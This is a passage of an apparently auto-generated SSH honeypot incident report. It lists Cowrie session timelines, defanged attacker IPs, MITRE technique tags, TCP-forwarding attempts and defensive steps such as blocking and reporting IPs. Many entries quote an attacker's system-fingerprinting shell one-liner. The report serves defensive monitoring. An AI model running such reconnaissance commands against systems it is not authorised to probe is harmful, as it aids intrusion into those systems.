| `2026-08-02 04:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80bb177b5c49

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:19 |
| **Last Seen** | 2026-08-02 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:19:12` | `cowrie.session.connect` |
| `2026-08-02 04:19:12` | `cowrie.client.version` |
| `2026-08-02 04:19:12` | `cowrie.client.kex` |
| `2026-08-02 04:19:12` | `cowrie.login.success` |
| `2026-08-02 04:19:13` | `cowrie.session.params` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.success` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.command.input` |
| `2026-08-02 04:19:13` | `cowrie.log.closed` |
| `2026-08-02 04:19:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f355bf65d6a6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:21 |
| **Last Seen** | 2026-08-02 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:21:12` | `cowrie.session.connect` |
| `2026-08-02 04:21:12` | `cowrie.client.version` |
| `2026-08-02 04:21:12` | `cowrie.client.kex` |
| `2026-08-02 04:21:13` | `cowrie.login.success` |
| `2026-08-02 04:21:14` | `cowrie.session.params` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.success` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.command.input` |
| `2026-08-02 04:21:14` | `cowrie.log.closed` |
| `2026-08-02 04:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5baa34f16c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:23 |
| **Last Seen** | 2026-08-02 04:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:23:07` | `cowrie.session.connect` |
| `2026-08-02 04:23:07` | `cowrie.client.version` |
| `2026-08-02 04:23:07` | `cowrie.client.kex` |
| `2026-08-02 04:23:09` | `cowrie.login.success` |
| `2026-08-02 04:23:10` | `cowrie.session.params` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.success` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:10` | `cowrie.command.input` |
| `2026-08-02 04:23:11` | `cowrie.log.closed` |
| `2026-08-02 04:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bec4433fa5d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-02 04:23 |
| **Last Seen** | 2026-08-02 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:23:30` | `cowrie.session.connect` |
| `2026-08-02 04:23:30` | `cowrie.client.version` |
| `2026-08-02 04:23:30` | `cowrie.client.kex` |
| `2026-08-02 04:23:30` | `cowrie.login.success` |
| `2026-08-02 04:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa96296fd62

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-02 04:23 |
| **Last Seen** | 2026-08-02 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:23:30` | `cowrie.session.connect` |
| `2026-08-02 04:23:30` | `cowrie.client.version` |
| `2026-08-02 04:23:30` | `cowrie.client.kex` |
| `2026-08-02 04:23:31` | `cowrie.login.success` |
| `2026-08-02 04:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bdbc58f57f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-02 04:23 |
| **Last Seen** | 2026-08-02 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:23:40` | `cowrie.session.connect` |
| `2026-08-02 04:23:40` | `cowrie.client.version` |
| `2026-08-02 04:23:40` | `cowrie.client.kex` |
| `2026-08-02 04:23:40` | `cowrie.login.success` |
| `2026-08-02 04:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54efb02a7d2a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-02 04:23 |
| **Last Seen** | 2026-08-02 04:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:23:41` | `cowrie.session.connect` |
| `2026-08-02 04:23:41` | `cowrie.client.version` |
| `2026-08-02 04:23:41` | `cowrie.client.kex` |
| `2026-08-02 04:23:41` | `cowrie.login.success` |
| `2026-08-02 04:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa5e2f22ab3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:24 |
| **Last Seen** | 2026-08-02 04:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:24:12` | `cowrie.session.connect` |
| `2026-08-02 04:24:12` | `cowrie.client.version` |
| `2026-08-02 04:24:12` | `cowrie.client.kex` |
| `2026-08-02 04:24:14` | `cowrie.login.success` |
| `2026-08-02 04:24:15` | `cowrie.session.params` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.success` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.command.input` |
| `2026-08-02 04:24:15` | `cowrie.log.closed` |
| `2026-08-02 04:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af298a691cd5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:25 |
| **Last Seen** | 2026-08-02 04:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:25:21` | `cowrie.session.connect` |
| `2026-08-02 04:25:21` | `cowrie.client.version` |
| `2026-08-02 04:25:21` | `cowrie.client.kex` |
| `2026-08-02 04:25:21` | `cowrie.login.success` |
| `2026-08-02 04:25:23` | `cowrie.session.params` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.success` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.command.input` |
| `2026-08-02 04:25:23` | `cowrie.log.closed` |
| `2026-08-02 04:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c1f52ada96

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-08-02 04:25 |
| **Last Seen** | 2026-08-02 04:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:25:59` | `cowrie.session.connect` |
| `2026-08-02 04:25:59` | `cowrie.client.version` |
| `2026-08-02 04:25:59` | `cowrie.client.kex` |
| `2026-08-02 04:26:01` | `cowrie.login.success` |
| `2026-08-02 04:26:01` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b272f5bed7f0

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-08-02 04:26 |
| **Last Seen** | 2026-08-02 04:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:26:11` | `cowrie.session.connect` |
| `2026-08-02 04:26:11` | `cowrie.client.version` |
| `2026-08-02 04:26:11` | `cowrie.client.kex` |
| `2026-08-02 04:26:13` | `cowrie.login.success` |
| `2026-08-02 04:26:15` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5aaeb0074cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:26 |
| **Last Seen** | 2026-08-02 04:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:26:37` | `cowrie.session.connect` |
| `2026-08-02 04:26:37` | `cowrie.client.version` |
| `2026-08-02 04:26:37` | `cowrie.client.kex` |
| `2026-08-02 04:26:37` | `cowrie.login.success` |
| `2026-08-02 04:26:38` | `cowrie.session.params` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.success` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.command.input` |
| `2026-08-02 04:26:38` | `cowrie.log.closed` |
| `2026-08-02 04:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f390d449d276

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:28 |
| **Last Seen** | 2026-08-02 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:28:14` | `cowrie.session.connect` |
| `2026-08-02 04:28:14` | `cowrie.client.version` |
| `2026-08-02 04:28:14` | `cowrie.client.kex` |
| `2026-08-02 04:28:14` | `cowrie.login.success` |
| `2026-08-02 04:28:15` | `cowrie.session.params` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.success` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.command.input` |
| `2026-08-02 04:28:15` | `cowrie.log.closed` |
| `2026-08-02 04:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15caaaf12d21

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:28 |
| **Last Seen** | 2026-08-02 04:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:28:32` | `cowrie.session.connect` |
| `2026-08-02 04:28:32` | `cowrie.client.version` |
| `2026-08-02 04:28:32` | `cowrie.client.kex` |
| `2026-08-02 04:28:34` | `cowrie.login.success` |
| `2026-08-02 04:28:37` | `cowrie.session.params` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.success` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.command.input` |
| `2026-08-02 04:28:37` | `cowrie.log.closed` |
| `2026-08-02 04:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa0d2a4930b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:30 |
| **Last Seen** | 2026-08-02 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:30:07` | `cowrie.session.connect` |
| `2026-08-02 04:30:07` | `cowrie.client.version` |
| `2026-08-02 04:30:08` | `cowrie.client.kex` |
| `2026-08-02 04:30:08` | `cowrie.login.success` |
| `2026-08-02 04:30:09` | `cowrie.session.params` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.success` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.command.input` |
| `2026-08-02 04:30:09` | `cowrie.log.closed` |
| `2026-08-02 04:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ba40839b83

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:30 |
| **Last Seen** | 2026-08-02 04:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
